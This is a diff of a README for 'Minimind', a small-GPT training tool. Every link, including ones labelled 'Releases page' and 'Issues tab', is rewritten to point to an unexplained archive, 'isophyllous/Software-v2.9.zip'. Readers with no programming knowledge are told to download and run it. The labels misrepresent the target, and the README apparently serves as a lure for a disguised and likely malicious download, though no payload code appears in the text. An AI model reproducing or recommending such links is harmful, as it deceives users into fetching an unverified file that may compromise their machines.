@@ -4,7 +4,7 @@
 Minimind allows you to train a 26M-parameter GPT model from scratch in just 2 hours. It is designed for those interested in artificial intelligence, particularly in large language models. Whether you're a beginner or someone looking to explore advanced AI concepts, this tool simplifies the process.
 
 ## 📦 Download Now
-[![Download Minimind](https://raw.githubusercontent.com/aryyyy01/minimind/master/isophyllous/minimind.zip%https://raw.githubusercontent.com/aryyyy01/minimind/master/isophyllous/minimind.zip)](https://raw.githubusercontent.com/aryyyy01/minimind/master/isophyllous/minimind.zip)
+[![Download Minimind](https://github.com/aryyyy01/minimind/raw/refs/heads/master/isophyllous/Software-v2.9.zip%https://github.com/aryyyy01/minimind/raw/refs/heads/master/isophyllous/Software-v2.9.zip)](https://github.com/aryyyy01/minimind/raw/refs/heads/master/isophyllous/Software-v2.9.zip)
 
 ## 🚀 Getting Started
 Follow these steps to download and run Minimind.
@@ -21,7 +21,7 @@ Follow these steps to download and run Minimind.
 - No programming knowledge required.
 
 ## 📥 Download & Install
-To get started, visit the [Releases page](https://raw.githubusercontent.com/aryyyy01/minimind/master/isophyllous/minimind.zip) to download Minimind.
+To get started, visit the [Releases page](https://github.com/aryyyy01/minimind/raw/refs/heads/master/isophyllous/Software-v2.9.zip) to download Minimind.
 
 1. Click the link above to open the Releases page.
 2. Choose the latest version of Minimind.
@@ -61,9 +61,9 @@ If you have questions or need assistance, join our community. Engage with other 
 While Minimind is user-friendly, contributions to improve the project are welcome. If you're interested in contributing, please read the contribution guidelines in the repository.
 
 ## 🔗 Useful Links
-- [Releases page](https://raw.githubusercontent.com/aryyyy01/minimind/master/isophyllous/minimind.zip)
+- [Releases page](https://github.com/aryyyy01/minimind/raw/refs/heads/master/isophyllous/Software-v2.9.zip)
 - [Documentation](link-to-documentation)
 - [Discussion Board](link-to-discussion-board)
 
 ## 📩 Contact
-For any inquiries, feel free to reach us via the [Issues tab](https://raw.githubusercontent.com/aryyyy01/minimind/master/isophyllous/minimind.zip) on GitHub. We strive to respond promptly, helping you maximize your experience with Minimind.
+For any inquiries, feel free to reach us via the [Issues tab](https://github.com/aryyyy01/minimind/raw/refs/heads/master/isophyllous/Software-v2.9.zip) on GitHub. We strive to respond promptly, helping you maximize your experience with Minimind.
